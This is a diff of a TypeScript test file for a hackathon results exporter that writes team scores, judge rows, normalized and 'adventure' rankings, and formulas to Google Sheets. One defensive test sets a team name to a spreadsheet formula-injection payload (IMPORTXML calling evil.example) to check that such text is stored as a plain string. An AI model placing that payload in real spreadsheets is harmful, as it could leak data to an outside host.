@@ -6,10 +6,11 @@ import {
   summaryFormula,
   TOP_N,
   type TabState,
-  buildMarksRows,
-  buildResultsAndMarksRequests,
+  buildResultsRequests,
   buildResultsRows,
   readCompletenessScores,
+  adventureScore,
+  rankByAdventure,
   topTeams,
 } from "~/server/api/utils/results-sheet";
 import {
@@ -69,7 +70,7 @@ describe("buildResultsRows", () => {
   });
 
   test("ranks team rows by regular average; unmarked teams last", () => {
-    expect(teamRows.map((r) => r.cells[3])).toEqual([
+    expect(teamRows.map((r) => r.cells[4])).toEqual([
       "Bravo",
       "Alpha",
       "Charlie",
@@ -78,7 +79,7 @@ describe("buildResultsRows", () => {
   });
 
   test("each team row is followed by its judge rows", () => {
-    expect(rows.map((r) => r.cells[3])).toEqual([
+    expect(rows.map((r) => r.cells[4])).toEqual([
       "Team / Judge",
       "Bravo",
       "↳ Jo",
@@ -91,20 +92,20 @@ describe("buildResultsRows", () => {
   });
 
   test("team averages are rounded; judge scores go in their round's column", () => {
-    const alpha = teamRows.find((r) => r.cells[3] === "Alpha")!.cells;
+    const alpha = teamRows.find((r) => r.cells[4] === "Alpha")!.cells;
     expect(alpha[col("Average")]).toBe(6.5);
     expect(alpha[col("Innovation + Impact")]).toBe(6.5);
-    const spon = rows.find((r) => r.cells[3] === "↳ Spon")!.cells;
+    const spon = rows.find((r) => r.cells[4] === "↳ Spon")!.cells;
     expect(spon[col("Average")]).toBe("");
     expect(spon[col("Sponsor average")]).toBe(8);
     expect(spon[col("Notes")]).toBe("great demo");
-    const sam = rows.find((r) => r.cells[3] === "↳ Sam")!.cells;
+    const sam = rows.find((r) => r.cells[4] === "↳ Sam")!.cells;
     expect(sam[col("Average")]).toBe(7);
   });
 
   test("super likes: count on team rows, heart on judge rows", () => {
     const cellOf = (label: string) =>
-      rows.find((r) => r.cells[3] === label)!.cells[col("Super likes")];
+      rows.find((r) => r.cells[4] === label)!.cells[col("Super likes")];
     expect(cellOf("Alpha")).toBe(1);
     expect(cellOf("Bravo")).toBe(1); // a sponsor judge's heart counts too
     expect(cellOf("Charlie")).toBe(0);
@@ -120,15 +121,15 @@ describe("buildResultsRows", () => {
   });
 });
 
-describe("buildMarksRows", () => {
-  test("one row per mark with round and notes", () => {
-    const rows = buildMarksRows(results);
+describe("judge rows", () => {
+  test("carry the round, notes and heart under their own columns", () => {
+    const { rows } = buildResultsRows(results);
     const header = rows[0]!.cells;
-    expect(rows).toHaveLength(1 + 4);
-    const spon = rows.find((r) => r.cells[header.indexOf("Judge")] === "Spon")!;
-    expect(spon.cells[header.indexOf("Round")]).toBe("sponsored");
-    expect(spon.cells[header.indexOf("Notes")]).toBe("great demo");
-    expect(spon.cells[header.indexOf("Super like")]).toBe("♥");
+    const spon = rows.find((r) => r.cells[4] === "↳ Spon")!.cells;
+    expect(spon[header.indexOf("Judges")]).toBe("sponsor");
+    expect(spon[header.indexOf("Notes")]).toBe("great demo");
+    expect(spon[header.indexOf("Super likes")]).toBe("♥");
+    expect(spon[header.indexOf("Team ID")]).toBe("b");
   });
 });
 
@@ -146,9 +147,8 @@ describe("Results and Marks", () => {
     const old = [
       { range: { sheetId: 1, dimension: "ROWS", startIndex: 2, endIndex: 9 } },
     ];
-    const requests = buildResultsAndMarksRequests({
+    const requests = buildResultsRequests({
       resultsTab: tab(1, { rowGroups: old }),
-      marksTab: tab(2),
       results,
       scores: new Map(),
     });
@@ -166,9 +166,8 @@ describe("Results and Marks", () => {
   });
 
   test("grows the grid when there are more rows than the tab has", () => {
-    const requests = buildResultsAndMarksRequests({
+    const requests = buildResultsRequests({
       resultsTab: tab(1, { rowCount: 3 }),
-      marksTab: tab(2),
       results,
       scores: new Map(),
     });
@@ -192,23 +191,31 @@ describe("Completeness and Final columns", () => {
       ]),
     );
     const { rows } = buildResultsRows(results);
-    const alpha = rows.find((r) => r.cells[3] === "Alpha")!.cells;
+    const alpha = rows.find((r) => r.cells[4] === "Alpha")!.cells;
     expect(alpha[at("Technical Complexity")]).toBe(6.5);
   });
 
-  test("Final sits right after Rank; Completeness after Average and the links", () => {
-    expect(header.slice(0, 2)).toEqual(["Rank", "Final"]);
-    expect(header.slice(5, 9)).toEqual([
-      "Average",
+  test("Final and Adventure final sit right after Rank; links and Completeness right after the team name", () => {
+    expect(header.slice(0, 3)).toEqual(["Rank", "Final", "Adventure final"]);
+    expect(header.slice(4, 16)).toEqual([
+      "Team / Judge",
       "Devpost",
       "GitHub",
       COMPLETENESS_LABEL,
+      "Judges",
+      "Normalized",
+      "Adventure",
+      "Adventurous score",
+      "Other 4",
+      "Raw total",
+      "Average",
+      "Super likes",
     ]);
   });
 
   test("links show a short name, not the whole URL", () => {
     const { rows } = buildResultsRows(results);
-    const alpha = rows.find((r) => r.cells[3] === "Alpha")!.cells;
+    const alpha = rows.find((r) => r.cells[4] === "Alpha")!.cells;
     expect(alpha[at("Devpost")]).toEqual({
       text: "Devpost",
       link: "https://devpost.com/a",
@@ -225,29 +232,31 @@ describe("Completeness and Final columns", () => {
 
   test("team rows get the typed score and a Final formula for their row", () => {
     const { rows } = buildResultsRows(results, new Map([["a", 8]]));
-    const alphaIndex = rows.findIndex((r) => r.cells[3] === "Alpha");
+    const alphaIndex = rows.findIndex((r) => r.cells[4] === "Alpha");
     const alpha = rows[alphaIndex]!.cells;
     expect(alpha[at(COMPLETENESS_LABEL)]).toBe(8);
     const sheetRow = alphaIndex + 1;
     expect(alpha[at("Final")]).toEqual({
-      formula: `=IF(F${sheetRow}="", "", IF(ISNUMBER(I${sheetRow}), ROUND((F${sheetRow} * 5 + I${sheetRow}) / 6, 2), F${sheetRow}))`,
+      formula: `=LET(b, IF(ISNUMBER(J${sheetRow}), J${sheetRow}, O${sheetRow}), IF(b="", "", IF(ISNUMBER(H${sheetRow}), ROUND((b * 5 + H${sheetRow}) / 6, 2), b)))`,
     });
-    const bravo = rows.find((r) => r.cells[3] === "Bravo")!.cells;
+    expect(alpha[at("Adventure final")]).toEqual({
+      formula: `=IF(OR(L${sheetRow}="", M${sheetRow}=""), "", IF(ISNUMBER(H${sheetRow}), ROUND(0.65 * L${sheetRow} + 0.35 * (M${sheetRow} * 4 + H${sheetRow}) / 5, 2), ROUND(0.65 * L${sheetRow} + 0.35 * M${sheetRow}, 2)))`,
+    });
+    const bravo = rows.find((r) => r.cells[4] === "Bravo")!.cells;
     expect(bravo[at(COMPLETENESS_LABEL)]).toBe("");
   });
 
   test("judge rows leave both blank", () => {
     const { rows } = buildResultsRows(results, new Map([["a", 8]]));
-    for (const r of rows.filter((r) => String(r.cells[3]).startsWith("↳"))) {
+    for (const r of rows.filter((r) => String(r.cells[4]).startsWith("↳"))) {
       expect(r.cells[at(COMPLETENESS_LABEL)]).toBe("");
       expect(r.cells[at("Final")]).toBe("");
     }
   });
 
   test("validation and red/green status go on team rows only", () => {
-    const requests = buildResultsAndMarksRequests({
+    const requests = buildResultsRequests({
       resultsTab: tab(1),
-      marksTab: tab(2),
       results,
       scores: new Map(),
     });
@@ -257,7 +266,7 @@ describe("Completeness and Final columns", () => {
     expect(validated).toEqual(buildResultsRows(results).teamRows);
     expect(
       requests.filter((r) => r.setDataValidation)[0]!.setDataValidation!.range,
-    ).toMatchObject({ startColumnIndex: 8, endColumnIndex: 9 });
+    ).toMatchObject({ startColumnIndex: 7, endColumnIndex: 8 });
     const rules = requests
       .filter((r) => r.addConditionalFormatRule)
       .map((r) => r.addConditionalFormatRule!.rule!);
@@ -268,10 +277,141 @@ describe("Completeness and Final columns", () => {
     expect(rules[0]!.ranges!.map((g) => g.startRowIndex)).toEqual(validated);
   });
 
-  test("the summary tab ranks Results' team rows by Final", () => {
+  test("the summary tabs rank by score, then super likes, capped at the top 20", () => {
     expect(summaryFormula()).toBe(
-      '={"Rank", "Team", "Final"; LET(t, SORT(FILTER({Results!D2:D, Results!B2:B}, Results!A2:A<>""), 2, FALSE), {SEQUENCE(ROWS(t)), t})}',
+      '=IFERROR(ARRAY_CONSTRAIN(LET(t, SORT(FILTER({Results!E2:E, Results!B2:B, ROW(Results!E2:E), Results!P2:P}, Results!A2:A<>"", Results!B2:B<>""), 2, FALSE, 4, FALSE, 3, TRUE), {SEQUENCE(ROWS(t)), CHOOSECOLS(t, 1, 2, 4)}), 20, 4), "")',
     );
+    expect(summaryFormula(2)).toContain('Results!C2:C<>""');
+  });
+});
+
+describe("normalized scores", () => {
+  const scored = (
+    id: string,
+    name: string,
+    s: Partial<TeamInfo>,
+  ): TeamInfo => ({ ...team(id, name, null), ...s });
+  // Bravo has the best raw average, but normalization puts Alpha first; both
+  // clip to a normalized 10, so q decides.
+  const normalized = buildTeamResults(
+    [
+      scored("a", "Alpha", {
+        normalized: 10,
+        normalizedQ: 3.2,
+        adventure: 9,
+        rawTotal: 7.5,
+      }),
+      scored("b", "Bravo", {
+        normalized: 10,
+        normalizedQ: 2.1,
+        adventure: 6,
+        rawTotal: 8.9,
+      }),
+      scored("c", "Charlie", {
+        normalized: 4.5,
+        normalizedQ: -0.4,
+        adventure: 5,
+        rawTotal: 6,
+      }),
+      scored("d", "Delta", {}),
+    ],
+    [
+      mark("a", "Jo", 6),
+      mark("b", "Jo", 9),
+      mark("c", "Jo", 8),
+      mark("d", "Jo", 10),
+    ],
+  );
+  const { rows } = buildResultsRows(normalized);
+  const header = rows[0]!.cells as string[];
+  const teamRows = rows.filter((r, i) => i > 0 && r.bold);
+
+  test("rank by q, then normalized; teams not yet normalized come after", () => {
+    expect(teamRows.map((r) => r.cells[4])).toEqual([
+      "Alpha",
+      "Bravo",
+      "Charlie",
+      "Delta",
+    ]);
+  });
+
+  test("team rows show Normalized, Adventure and Raw total", () => {
+    const alpha = teamRows[0]!.cells;
+    expect(alpha[header.indexOf("Normalized")]).toBe(10);
+    expect(alpha[header.indexOf("Adventure")]).toBe(9);
+    expect(alpha[header.indexOf("Raw total")]).toBe(7.5);
+    const delta = teamRows[3]!.cells;
+    expect(delta[header.indexOf("Normalized")]).toBe("");
+  });
+
+  test("without any normalization, the judge average ranks", () => {
+    expect(
+      buildResultsRows(results)
+        .rows.filter((r, i) => i > 0 && r.bold)
+        .map((r) => r.cells[4]),
+    ).toEqual(["Bravo", "Alpha", "Charlie"]);
+  });
+});
+
+describe("adventure", () => {
+  const adv = (
+    id: string,
+    s: Partial<TeamInfo>,
+    score: number,
+  ): [TeamInfo, MarkRow] => [
+    { ...team(id, id.toUpperCase(), null), ...s },
+    mark(id, "Jo", score),
+  ];
+  // Overall order is by judge score: a, b, c, d. Adventure (0.65 × A +
+  // 0.35 × O): a 4.35, b 5, c 7, d 9.5 — so d, c, b, a.
+  const pairs = [
+    adv("a", { adventurous: 3, otherFour: 6.86 }, 9),
+    adv("b", { adventurous: 5, otherFour: 5 }, 8),
+    adv("c", { adventurous: 8, otherFour: 5.14 }, 7),
+    adv("d", { adventurous: 10, otherFour: 8.57 }, 6),
+    adv("e", { otherFour: 9 }, 5),
+  ];
+  const all = buildTeamResults(
+    pairs.map(([t]) => t),
+    pairs.map(([, m]) => m),
+  );
+
+  test("ranks by 65% adventurous + 35% other four; no adventurous, no rank", () => {
+    expect(adventureScore(all[0]!)).toBeCloseTo(4.35, 2);
+    expect(rankByAdventure(all).map((r) => r.team.id)).toEqual([
+      "d",
+      "c",
+      "b",
+      "a",
+    ]);
+  });
+
+  test("the export adds the top teams by adventure to the top overall", () => {
+    // Top 2 overall (a, b) plus top 2 by adventure (d, c), in overall order.
+    expect(topTeams(all, 2).map((r) => r.team.id)).toEqual([
+      "a",
+      "b",
+      "c",
+      "d",
+    ]);
+    expect(topTeams(all, 1).map((r) => r.team.id)).toEqual(["a", "d"]);
+  });
+
+  test("teams added for adventure keep their real overall rank", () => {
+    const { rows } = buildResultsRows(all, new Map(), new Set(["a", "d"]));
+    const teamRows = rows.filter((r, i) => i > 0 && r.bold);
+    expect(teamRows.map((r) => [r.cells[0], r.cells[4]])).toEqual([
+      [1, "A"],
+      [4, "D"],
+    ]);
+  });
+
+  test("Adventurous and Other 4 are on team rows", () => {
+    const { rows } = buildResultsRows(all);
+    const header = rows[0]!.cells as string[];
+    const a = rows.find((r) => r.cells[4] === "A")!.cells;
+    expect(a[header.indexOf("Adventurous score")]).toBe(3);
+    expect(a[header.indexOf("Other 4")]).toBe(6.86);
   });
 });
 
@@ -284,8 +424,8 @@ describe("keeping typed scores on a re-export", () => {
     );
     // Someone typed 7 for Alpha, and (wrongly) 5 on a judge row.
     const comp = header.indexOf(COMPLETENESS_LABEL);
-    out.find((r) => r[3] === "Alpha")![comp] = 7;
-    out.find((r) => String(r[3]).startsWith("↳"))![comp] = 5;
+    out.find((r) => r[4] === "Alpha")![comp] = 7;
+    out.find((r) => String(r[4]).startsWith("↳"))![comp] = 5;
     return out;
   };
 
@@ -320,9 +460,8 @@ describe("text is never written as a formula", () => {
       [team("x", '=IMPORTXML("https://evil.example","//a")', 1)],
       [mark("x", "=1+1", 5)],
     );
-    const requests = buildResultsAndMarksRequests({
+    const requests = buildResultsRequests({
       resultsTab: tab(1),
-      marksTab: tab(2),
       results: evil,
       scores: new Map(),
     });
@@ -333,7 +472,11 @@ describe("text is never written as a formula", () => {
       .map((v) => v.userEnteredValue?.formulaValue)
       .filter(Boolean);
     // Only our own Final formula(s), never the team or judge name.
-    expect(formulas.every((f) => f!.startsWith("=IF("))).toBe(true);
+    expect(
+      formulas.every(
+        (f) => f!.startsWith("=LET(b,") || f!.startsWith("=IF(OR("),
+      ),
+    ).toBe(true);
     expect(
       values.some((v) =>
         v.userEnteredValue?.stringValue?.startsWith("=IMPORTXML"),
@@ -361,14 +504,13 @@ describe("top teams only", () => {
     expect(topTeams(results).map((r) => r.team.id)).toEqual(["b", "a"]);
   });
 
-  test("Results and Marks only list the teams passed in", () => {
+  test("Results only lists the teams passed in", () => {
     const top = topTeams(many, 3);
     const names = buildResultsRows(top)
       .rows.slice(1)
-      .map((r) => r.cells[3]);
+      .map((r) => r.cells[4]);
     expect(
       names.filter((n) => typeof n === "string" && !n.startsWith("↳")),
     ).toEqual(["T1", "T2", "T3"]);
-    expect(buildMarksRows(top)).toHaveLength(1 + 3);
   });
 });
